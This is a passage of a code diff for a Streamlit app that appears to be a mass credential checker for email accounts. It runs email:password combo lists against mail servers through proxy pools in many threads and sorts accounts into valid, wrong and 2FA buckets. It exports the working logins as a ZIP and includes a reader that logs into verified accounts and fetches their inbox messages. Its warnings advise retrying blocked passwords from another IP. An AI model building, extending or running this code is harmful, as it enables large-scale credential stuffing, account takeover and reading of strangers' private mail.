+                    continue
+                items = snapshot.get(key) or []
+                with ph.container():
+                    if not items:
+                        str_lit.caption("nothing here yet")
+                        continue
+                    str_lit.caption(f"{len(items)} account(s)")
+                    col = TAG_COLORS.get(BUCKET_TAGS.get(key, ""), "#cbd5e1")
+                    for ln in items[-BUCKET_RENDER_TAIL:]:
+                        str_lit.markdown(
+                            f"<div style='font-family:ui-monospace,monospace;font-size:12px;"
+                            f"color:{col}'>{html.escape(str(ln))}</div>",
+                            unsafe_allow_html=True,
+                        )
+
+        def check_task(line):
+            try:
+                if ":" not in line:
+                    return {"line": f"{line} | Error: Invalid format", "status": FAILED,
+                            "trace": ["Invalid format"]}
+                email, password = line.split(":", 1)
+                email, password = email.strip(), password.strip()
+                reason = drop_before_check(email)
+                if reason:
+                    return {"line": f"{email}:{password} | {reason}", "email": email,
+                            "password": password, "status": SKIP, "detail": reason,
+                            "trace": [reason]}
+                domain = email.split("@")[-1].lower()
+                conf = get_servers(email)
+                if not hasattr(thread_local, "state"):
+                    thread_local.state = {}
+                server, status, detail, px_used, trace = check_account_sync(
+                    email, password, conf, domain, active_proxy_pool, thread_local.state)
+                return {"line": f"{email}:{password} | {detail}", "email": email,
+                        "password": password, "status": status, "detail": detail,
+                        "trace": trace}
+            except Exception as ex:
+                return {"line": f"{line} | Error: {ex}", "email": line, "password": "",
+                        "status": FAILED, "detail": str(ex), "trace": [str(ex)]}
+            finally:
+                if hasattr(thread_local, "state"):
+                    try:
+                        thread_local.state.clear()
+                    except Exception:
+                        pass
+# @@END 105 RUN_TRIGGER_UI
+
+# @@BLOCK 106 RUN_LOOP deps=014,083,105
+        detected_stop_reason = "Interrupted / Stopped before completion"
+        run_interrupted = False
+        try:
+            current_workers = CFG["MAX_WORKERS_START"]
+            if CFG.get("DYNAMIC_WORKER_SCALING", False):
+                if total_accs > 500:
+                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35,
+                                          CFG["MAX_WORKERS_START"] * 2)
+                elif total_accs < 20:
+                    current_workers = max(2, min(5, total_accs))
+
+            with ThreadPoolExecutor(max_workers=current_workers) as executor:
+                future_to_line = {executor.submit(check_task, line): line
+                                  for line in all_target_accounts}
+
+                for index, future in enumerate(as_completed(future_to_line), 1):
+                    checked_count += 1
+                    try:
+                        res = future.result(
+                            timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + WORKER_FUTURE_PAD)
+                        if res:
+                            st_val = res["status"]
+                            em_val = res.get('email', '').strip().lower()
+
+                            with session_state_lock:
+                                if em_val:
+                                    str_lit.session_state.checked_emails_set.add(em_val)
+                                if st_val == VALID:
+                                    if res["line"] not in str_lit.session_state.valid_results:
+                                        str_lit.session_state.valid_results.append(res["line"])
+                                        str_lit.session_state.run_valid_count += 1
+                                    str_lit.session_state.clean_valid_count = \
+                                        str_lit.session_state.run_valid_count
+                                elif st_val == WRONG:
+                                    str_lit.session_state.wrong_results.append(res["line"])
+                                elif st_val == APP:
+                                    str_lit.session_state.need_app_results.append(res["line"])
+                                elif st_val == LOGIN_DROPPED:
+                                    str_lit.session_state.login_drop_results.append(res["line"])
+                                elif st_val == RETRY:
+                                    str_lit.session_state.retry_results.append(res["line"])
+                                elif st_val == RBL:
+                                    str_lit.session_state.rbl_results.append(res["line"])
+                                elif st_val == SMTP_FAILED:
+                                    str_lit.session_state.smtp_results.append(res["line"])
+                                elif st_val == DNS_FAILED:
+                                    str_lit.session_state.dns_results.append(res["line"])
+                                elif st_val == PROXY_UNHEALTHY:
+                                    str_lit.session_state.proxy_results.append(res["line"])
+                                elif st_val == SKIP:
+                                    str_lit.session_state.skip_results.append(res["line"])
+                                elif st_val == UNKNOWN:
+                                    str_lit.session_state.unknown_results.append(res["line"])
+                                else:
+                                    str_lit.session_state.conn_results.append(res["line"])
+
+                                str_lit.session_state.log_lines.append(
+                                    f"[{st_val.upper()}] {res.get('email', '')} -> "
+                                    f"{res.get('detail', '')}")
+                                if len(str_lit.session_state.log_lines) > log_cap:
+                                    str_lit.session_state.log_lines.pop(0)
+
+                                trace_text = "\n  ↳ ".join(
+                                    res.get("trace", ["No trace recorded"]))
+                                cred_combo = (f"{res.get('email', '')}:{res.get('password', '')}"
+                                              if res.get('password') else res.get('email', ''))
+                                str_lit.session_state.report_entries.append({
+                                    "Time": datetime.now().strftime("%H:%M:%S"),
+                                    "Email:Password": cred_combo,
+                                    "Status": st_val.upper(),
+                                    "Under-The-Hood Background Trace":
+                                        f"Result: {res.get('detail', '')}\n"
+                                        f"Steps Executed:\n  ↳ {trace_text}",
+                                })
+                                if len(str_lit.session_state.report_entries) > REPORT_ENTRIES_MAX:
+                                    del str_lit.session_state.report_entries[:-REPORT_ENTRIES_MAX]
+
+                                valid_len = len(str_lit.session_state.valid_results)
+                                wrong_len = len(str_lit.session_state.wrong_results)
+                                need_len = len(str_lit.session_state.need_app_results)
+                                login_drop_len = len(str_lit.session_state.login_drop_results)
+                                conn_len = len(str_lit.session_state.conn_results)
+                                proxy_len = len(str_lit.session_state.proxy_results)
+                                retry_len = len(str_lit.session_state.retry_results)
+                                rbl_len = len(str_lit.session_state.rbl_results)
+                                smtp_len = len(str_lit.session_state.smtp_results)
+                                skip_len = len(str_lit.session_state.skip_results)
+                                unknown_len = len(str_lit.session_state.unknown_results)
+                                current_logs = list(str_lit.session_state.log_lines)
+                                current_reports = list(str_lit.session_state.report_entries)
+                                bucket_snapshot = {
+                                    "valid_results": list(str_lit.session_state.valid_results),
+                                    "wrong_results": list(str_lit.session_state.wrong_results),
+                                    "conn_results": list(str_lit.session_state.conn_results),
+                                    "proxy_results": list(str_lit.session_state.proxy_results),
+                                    "login_drop_results": list(str_lit.session_state.login_drop_results),
+                                    "need_app_results": list(str_lit.session_state.need_app_results),
+                                    "retry_results": list(str_lit.session_state.retry_results),
+                                    "rbl_results": list(str_lit.session_state.rbl_results),
+                                    "smtp_results": list(str_lit.session_state.smtp_results),
+                                    "dns_results": list(str_lit.session_state.dns_results),
+                                    "skip_results": list(str_lit.session_state.skip_results),
+                                    "unknown_results": list(str_lit.session_state.unknown_results),
+                                }
+
+                            time.sleep(0.01)
+
+                            _now_ui = time.time()
+                            if (checked_count >= total_accs) \
+                                    or (_now_ui - _last_ui_ts) >= UI_MIN_INTERVAL:
+                                _last_ui_ts = _now_ui
+                                if str_lit.session_state.get("colorize_logs", True):
+                                    log_container.markdown(colorize_logs(current_logs),
+                                                           unsafe_allow_html=True)
+                                else:
+                                    log_container.code("\n".join(current_logs), language="text")
+
+                                with report_metrics_placeholder.container():
+                                    _m_pairs = [
+                                        ("✅ Valid", valid_len), ("❌ Wrong", wrong_len),
+                                        ("🔑 AppPass/2FA", need_len),
+                                        ("🚪 Login Dropped", login_drop_len),
+                                        ("🔌 Conn Failed", conn_len),
+                                        ("🩹 Proxy Dead", proxy_len),
+                                        ("🕓 RETRY_LATER", retry_len), ("🚫 RBL", rbl_len),
+                                        ("📮 SMTP Failed", smtp_len),
+                                        ("⏭ Skipped", skip_len),
+                                        ("❓ Unclassified", unknown_len),
+                                        ("📋 Checked", checked_count),
+                                        ("📚 Queue", total_accs),
+                                    ]
+                                    for _mc, (_ml, _mv) in zip(metric_grid(_m_pairs, per_row=3),
+                                                               _m_pairs):
+                                        _mc.metric(_ml, _mv)
+
+                                render_buckets(bucket_snapshot)
+
+                                # FIX P1-4: rebuilding a DataFrame from scratch every
+                                # 0.12s was the other half of the run-time lag.
+                                if (checked_count >= total_accs) \
+                                        or (_now_ui - _last_df_ts) >= REPORT_DF_MIN_INTERVAL:
+                                    _last_df_ts = _now_ui
+                                    report_log_container.dataframe(
+                                        pd.DataFrame(current_reports[::-1]),
+                                        use_container_width=True, height=320)
+
+                    except Exception as ex:
+                        err_msg = f"[EXCEPTION] {str(ex)}"
+                        with session_state_lock:
+                            str_lit.session_state.conn_results.append(err_msg)
+                            str_lit.session_state.log_lines.append(err_msg)
+                            current_logs = list(str_lit.session_state.log_lines)
+                        if str_lit.session_state.get("colorize_logs", True):
+                            log_container.markdown(colorize_logs(current_logs),
+                                                   unsafe_allow_html=True)
+                        else:
+                            log_container.code("\n".join(current_logs), language="text")
+
+                    if checked_count % 25 == 0 or checked_count == total_accs:
+                        with session_state_lock:
+                            done = set(str_lit.session_state.checked_emails_set)
+                            valids = list(str_lit.session_state.valid_results)
+                        left = []
+                        for raw in all_target_accounts:
+                            em = raw.split(":", 1)[0].strip().lower() if ":" in raw else raw
+                            if em not in done:
+                                left.append(raw)
+                        if left:
+                            save_unfinished("In Progress (Running)", left, checked_count, total_accs)
+                        try:
+                            _write_clean_valid(f"# Live sync | this run valid {len(valids)}\n",
+                                               valids)
+                        except Exception:
+                            pass
+
+                    if total_accs > 0:
+                        pct = min(1.0, checked_count / total_accs)
+                        progress_bar.progress(
+                            pct, text=f"Checking accounts [{engine_action_mode}]: "
+                                      f"{checked_count}/{total_accs} ({int(pct * 100)}%)")
+                    with session_state_lock:
+                        v_len = len(str_lit.session_state.valid_results)
+                        w_len = len(str_lit.session_state.wrong_results)
+                        rt_len = len(str_lit.session_state.retry_results)
+                        px_len = len(str_lit.session_state.proxy_results)
+                        ld_len = len(str_lit.session_state.login_drop_results)
+                    status_text.text(
+                        f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | "
+                        f"Wrong: {w_len} | Login Dropped: {ld_len} | Proxy Dead: {px_len} | "
+                        f"RETRY_LATER: {rt_len}")
+
+        except MemoryError as me:
+            run_interrupted = True
+            detected_stop_reason = "Resource Exhaustion: RAM full / Out of Memory"
+            str_lit.error(f"⚠ Engine Stopped: RAM Full: {me}")
+        except (OSError, IOError) as oe:
+            run_interrupted = True
+            detected_stop_reason = ("Resource Exhaustion: Disk Space / ROM full"
+                                    if getattr(oe, 'errno', 0) == 28
+                                    else f"Filesystem / I/O Error: {oe}")
+            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
+        except (socket.timeout, ConnectionError, ssl.SSLError) as net_err:
+            run_interrupted = True
+            detected_stop_reason = f"Network Connection Failure: {net_err}"
+            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
+        except BaseException as be:
+            if isinstance(be, (SystemExit, KeyboardInterrupt)):
+                run_interrupted = True
+                detected_stop_reason = "System Shutdown / Interruption"
+                raise be
+            run_interrupted = True
+            _bn = type(be).__name__
+            if _bn in ("RerunException", "StopException", "ScriptStopped"):
+                detected_stop_reason = "User Interruption: UI interaction (Streamlit rerun)"
+                log_probe_event("run stopped by a Streamlit RerunException/StopException")
+            else:
+                be_str = str(be).lower()
+                if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket",
+                                             "closed", "connection lost"]):
+                    detected_stop_reason = "User Interruption: UI interaction"
+                else:
+                    detected_stop_reason = f"Unexpected Error / Interruption: {be}"
+        finally:
+            STATE["run_active"] = False
+            with session_state_lock:
+                done = set(str_lit.session_state.checked_emails_set)
+            left = [raw for raw in all_target_accounts
+                    if (raw.split(":", 1)[0].strip().lower() if ":" in raw else raw) not in done]
+            if checked_count >= total_accs and not run_interrupted:
+                clear_unfinished()
+            elif left:
+                save_unfinished(detected_stop_reason, left, checked_count, total_accs)
+
+        end_dt = datetime.now()
+        duration = end_dt - start_dt
+
+        with session_state_lock:
+            str_lit.session_state.run_completion_status = (
+                "Successful" if (checked_count >= total_accs and not run_interrupted)
+                else "Unfinished")
+            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
+            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
+            valid_snapshot = list(str_lit.session_state.valid_results)
+            wrong_snapshot = list(str_lit.session_state.wrong_results)
+            need_snapshot = list(str_lit.session_state.need_app_results)
+            login_drop_snapshot = list(str_lit.session_state.login_drop_results)
+            conn_snapshot = list(str_lit.session_state.conn_results)
+            proxy_snapshot = list(str_lit.session_state.proxy_results)
+            retry_snapshot = list(str_lit.session_state.retry_results)
+            rbl_snapshot = list(str_lit.session_state.rbl_results)
+            smtp_snapshot = list(str_lit.session_state.smtp_results)
+            dns_snapshot = list(str_lit.session_state.dns_results)
+            skip_snapshot = list(str_lit.session_state.skip_results)
+            unknown_snapshot = list(str_lit.session_state.unknown_results)
+
+        invalidate_valid_caches()
+
+        progress_bar.progress(1.0, text="Checking complete!")
+        status_text.success(
+            f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | "
+            f"Ended: {str_lit.session_state.end_timestamp} | "
+            f"Duration: {str_lit.session_state.total_duration}")
+# @@END 106 RUN_LOOP
+
+# @@BLOCK 107 RUN_EXPORT deps=078,106
+        try:
+            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
+            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
+            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
+            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
+            proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
+            login_drop_path = os.path.join(CFG["RESULTS_DIR"], f"login_dropped_{stamp}.txt")
+            retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
+            rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
+            smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
+            dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
+            skip_path = os.path.join(CFG["RESULTS_DIR"], f"skipped_{stamp}.txt")
+            unknown_path = os.path.join(CFG["RESULTS_DIR"], f"unclassified_{stamp}.txt")
+            try:
+                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
+            except OSError:
+                pass
+
+            hdr = (f"# Started: {str_lit.session_state.start_timestamp} | "
+                   f"Ended: {str_lit.session_state.end_timestamp} | "
+                   f"Duration: {str_lit.session_state.total_duration} | "
+                   f"Protocols: {'+'.join(active_protocols())} | Build: {BUILD_TAG}\n")
+            with file_write_lock:
+                for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
+                                   (need_path, need_snapshot),
+                                   (login_drop_path, login_drop_snapshot),
+                                   (failed_path, conn_snapshot),
+                                   (proxy_path, proxy_snapshot),
+                                   (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
+                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot),
+                                   (skip_path, skip_snapshot), (unknown_path, unknown_snapshot)):
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(hdr)
+                        f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))
+
+            clean_valid_path = CLEAN_VALID_FILE
+            temp_clean_count = _write_clean_valid(hdr, valid_snapshot)
+
+            zip_output_name = f"mail_results_{stamp}.zip"
+            with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
+                for p, arc in ((clean_valid_path, "valid_email_password.txt"),
+                               (wrong_path, os.path.basename(wrong_path)),
+                               (need_path, os.path.basename(need_path)),
+                               (login_drop_path, os.path.basename(login_drop_path)),
+                               (failed_path, os.path.basename(failed_path)),
+                               (proxy_path, os.path.basename(proxy_path)),
+                               (retry_path, os.path.basename(retry_path)),
+                               (rbl_path, os.path.basename(rbl_path)),
+                               (smtp_path, os.path.basename(smtp_path)),
+                               (dns_path, os.path.basename(dns_path)),
+                               (skip_path, os.path.basename(skip_path)),
+                               (unknown_path, os.path.basename(unknown_path))):
+                    if os.path.exists(p):
+                        z.write(p, arcname=arc)
+
+            zip_bytes_data = b""
+            if os.path.exists(zip_output_name):
+                with open(zip_output_name, "rb") as fp:
+                    zip_bytes_data = fp.read()
+
+            with session_state_lock:
+                str_lit.session_state.clean_valid_count = temp_clean_count
+                str_lit.session_state.zip_name = zip_output_name
+                str_lit.session_state.zip_bytes = zip_bytes_data
+        except Exception as ex:
+            str_lit.error(f"Error compiling results export files: {ex}")
+# @@END 107 RUN_EXPORT
+
+# @@BLOCK 108 RESULTS_SUMMARY deps=035,036,037,087,106
+if str_lit.session_state.engine_has_run or load_persistent_valid_results():
+    section_title("📊", "Live Results Summary & ZIP Archive",
+                  "persisted results, downloadable bundle, full under-the-hood traces")
+
+    with session_state_lock:
+        status_label = ("🎉 Check Complete!"
+                        if str_lit.session_state.run_completion_status == "Successful"
+                        else "⚠️ Unfinished / Loaded from Disk")
+        clean_count_val = str_lit.session_state.get("run_valid_count",
+                                                    str_lit.session_state.clean_valid_count)
+        wrong_len_val = len(str_lit.session_state.wrong_results)
+        need_len_val = len(str_lit.session_state.need_app_results)
+        login_drop_len_val = len(str_lit.session_state.login_drop_results)
+        conn_len_val = len(str_lit.session_state.conn_results)
+        proxy_len_val = len(str_lit.session_state.proxy_results)
+        retry_len_val = len(str_lit.session_state.retry_results)
+        rbl_len_val = len(str_lit.session_state.rbl_results)
+        smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
+        dns_len_val = len(str_lit.session_state.get("pre_dns_failed", []))
+        skip_len_val = len(str_lit.session_state.skip_results)
+        unknown_len_val = len(str_lit.session_state.unknown_results)
+        valid_res_copy = list(str_lit.session_state.valid_results)
+        log_lines_copy = list(str_lit.session_state.log_lines)
+        report_entries_copy = list(str_lit.session_state.report_entries)
+        zip_bytes_copy = str_lit.session_state.zip_bytes
+        zip_name_copy = str_lit.session_state.zip_name
+        start_ts_copy = str_lit.session_state.start_timestamp
+        end_ts_copy = str_lit.session_state.end_timestamp
+        duration_copy = str_lit.session_state.total_duration
+        summary_buckets = {
+            "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
+            "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
+            "🚪 Login Dropped (* BYE) - server answered, password untested":
+                list(str_lit.session_state.login_drop_results),
+            "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
+            "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
+            "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
+            "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
+            "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
+            "🛰 DNS Failed (pre-check)": list(str_lit.session_state.get("pre_dns_failed", [])),
+            "📮 SMTP Failed (pre-check)": list(str_lit.session_state.get("pre_smtp_failed", [])),
+            "⏭ Skipped / Filtered": list(str_lit.session_state.skip_results),
+            "❓ Unclassified": list(str_lit.session_state.unknown_results),
+        }
+
+    str_lit.markdown(f"### {status_label}")
+    str_lit.caption(f"Protocols dialled this run: **{' + '.join(active_protocols())}**"
+                    + ("  ·  SMTP/ManageSieve were CONFIRM-ONLY"
+                       if any(p in ("SMTP", "ManageSieve") for p in active_protocols()) else ""))
+
+    if str_lit.session_state.run_completion_status == "Unfinished":
+        unfinished_list = list_unfinished_runs()
+        if unfinished_list:
+            r0 = unfinished_list[0]
+            str_lit.warning(
+                f"⚠ **Engine Stopped Unfinished:** Reason: *{r0.get('reason', 'Unknown')}* | "
+                f"Progress at stop: {r0.get('checked', 0)}/{r0.get('total', 0)} | "
+                f"Saved at: {r0.get('saved_at', '')}")
+        else:
+            str_lit.warning("⚠ **Engine Stopped Unfinished.**")
+
+    if start_ts_copy and end_ts_copy:
+        str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | "
+                     f"Ended **{end_ts_copy}** | Duration **{duration_copy}**")
+
+    _s_pairs = [
+        ("✅ Clean Valid", clean_count_val),
+        ("❌ Wrong Password", wrong_len_val),
+        ("🔑 App Password / 2FA", need_len_val),
+        ("🚪 Login Dropped", login_drop_len_val),
+        ("🔌 Connection Failed", conn_len_val),
+        ("🩹 Proxy Unhealthy", proxy_len_val),
+        ("🚫 RBL Blocked", rbl_len_val),
+        ("🕓 RETRY_LATER", retry_len_val),
+        ("🛰 DNS Failed", dns_len_val),
+        ("📮 SMTP Failed", smtp_len_val),
+        ("⏭ Skipped", skip_len_val),
+        ("❓ Unclassified", unknown_len_val),
+        ("📚 Accounts In Buckets",
+         clean_count_val + wrong_len_val + need_len_val + login_drop_len_val
+         + conn_len_val + proxy_len_val + rbl_len_val + retry_len_val + skip_len_val
+         + unknown_len_val),
+    ]
+    for _sc, (_sl, _sv) in zip(metric_grid(_s_pairs, per_row=3), _s_pairs):
+        _sc.metric(_sl, _sv)
+
+    if login_drop_len_val:
+        str_lit.warning(
+            f"🚪 **{login_drop_len_val} account(s) hit a LOGIN DROP** - the mail server "
+            f"ANSWERED, accepted the LOGIN command and then closed the socket (* BYE). "
+            f"These passwords are still UNTESTED: it is usually a rejected password or an "
+            f"app-password requirement, so retry them from a different IP (or with an app "
+            f"password) before discarding them.")
+    if proxy_len_val:
+        str_lit.warning(
+            f"🩹 **{proxy_len_val} account(s) never reached a mailbox** - every attempt died "
+            f"with 407 Proxy Authentication Required. Those passwords are still UNTESTED.")
+    if skip_len_val:
+        str_lit.info(
+            f"⏭ **{skip_len_val} account(s) were skipped** (bad format / disposable / "
+            f"fast-mode cooldown). They were counted as checked; they are listed in the "
+            f"Skipped bucket and the ZIP.")
+    if wrong_len_val and CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True):
+        str_lit.caption(
+            "❌ Wrong Password was CONFIRMED across at least two hosts or two rungs (or with "
+            "no candidate left to dial) before being accepted. Turn the sidebar guard OFF "
+            "only if you need raw speed.")
+
+    for title, items in summary_buckets.items():
+        with str_lit.expander(f"{title} ({len(items)})", expanded=False):
+            if not items:
+                str_lit.caption("nothing here yet")
+                continue
+            for it in items:
+                str_lit.code(it, language="text")
+
+    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream",
+                                             "📊 Live Report Log & Analytics"])
+    with exec_tab1_p:
+        if log_lines_copy:
+            render_logs(log_lines_copy)
+        else:
+            str_lit.info("No logs available from previous run.")
+    with exec_tab2_p:
+        if report_entries_copy:
+            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]),
+                              use_container_width=True, height=320)
+        else:
+            str_lit.info("No report logs available.")
+
+    if zip_bytes_copy and zip_name_copy:
+        str_lit.download_button("📦 Download All Results (.zip Package)", data=zip_bytes_copy,
+                                file_name=zip_name_copy, mime="application/zip")
+# @@END 108 RESULTS_SUMMARY
+
+# @@BLOCK 109 IN_APP_READER deps=034,053,062,069,093,098
+section_title("📬", "Mailbox Reader (Interactive Inbox Inspection)",
+              "read verified inboxes without leaving the app")
+
+with session_state_lock:
+    current_valid_set = list(str_lit.session_state.valid_results) or load_persistent_valid_results()
+
+if not current_valid_set:
+    str_lit.info("Run the checker successfully or ensure valid account files exist to "
+                 "populate valid accounts.")
+else:
+    valid_combo_options = []
+    for item in current_valid_set:
+        try:
+            if ":" in item:
+                email_val, remainder = item.split(":", 1)
+                valid_combo_options.append(f"{email_val.strip()}:{remainder.split('|')[0].strip()}")
+        except Exception:
+            continue
+
+    if valid_combo_options:
+        selected_combo = str_lit.selectbox("Select Valid Account to Read:",
+                                           options=valid_combo_options, key="bb_reader_acct")
+        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", 1, 50, 10, 1,
+                                  key="bb_reader_max")
+
+        if str_lit.button("📖 Read Inbox Messages"):
+            if selected_combo:
+                acc_email, acc_pass = selected_combo.split(":", 1)
+                acc_email, acc_pass = acc_email.strip(), acc_pass.strip()
+                imap_hosts = get_servers(acc_email).get("imap", [])
+                mailbox_proxy = (sample_alive_proxy(domain=acc_email.split("@")[-1])
+                                 if use_proxy else None)
+
+                if not imap_hosts:
+                    str_lit.error("No IMAP host available for this provider domain name.")
+                else:
+                    with str_lit.spinner(f"Connecting via [{px_tag(mailbox_proxy)}] and "
+                                         f"fetching inbox for {acc_email}..."):
+                        success_read, fetched_msgs = False, []
+                        for srv in imap_hosts:
+                            msgs = read_mailbox_messages(acc_email, acc_pass, srv,
+                                                         proxy_str=mailbox_proxy,
+                                                         limit=max_msgs)
+                            if msgs and not any("Error reading mailbox" in m for m in msgs):
+                                fetched_msgs, success_read = msgs, True
+                                break
+                            elif msgs:
+                                fetched_msgs = msgs
+                        if success_read:
+                            str_lit.success("Successfully retrieved recent messages "
+                                            "from mailbox!")
+                            for idx, m_content in enumerate(fetched_msgs, 1):
+                                str_lit.markdown(f"**Message {idx}:**")
+                                str_lit.code(m_content, language="text")
+                        else:
+                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
+# @@END 109 IN_APP_READER
+
+# @@BLOCK 110 FOOTER deps=008,034
+section_title("🧭", "Navigation", f"{BUILD_TAG} - block edition")
+
+_n1, _n2, _n3 = str_lit.columns(3)
+with _n1:
+    try:
+        str_lit.page_link("pages/3_Mailbox_Reader.py", label="📥 Mailbox Reader",
+                          use_container_width=True)
+    except Exception:
+        str_lit.caption("Reader lives at pages/3_Mailbox_Reader.py")
+with _n2:
+    try:
+        str_lit.page_link("pages/2_Diagnostics.py", label="🔍 Diagnostics",
+                          use_container_width=True)
+    except Exception:
+        str_lit.caption("Diagnostics lives at pages/2_Diagnostics.py")
+with _n3:
+    try:
+        str_lit.page_link("pages/4_Downloads.py", label="📦 Export Studio",
+                          use_container_width=True)
+    except Exception:
+        str_lit.caption("Export Studio lives at pages/4_Downloads.py")
+
+str_lit.caption(
+    f"Build {BUILD_TAG} · CFG {CFG_VERSION} · block edition. "
+    f"Every section is a replaceable @@BLOCK - run verify_blocks.py after every paste."
+)
+# @@END 110 FOOTER
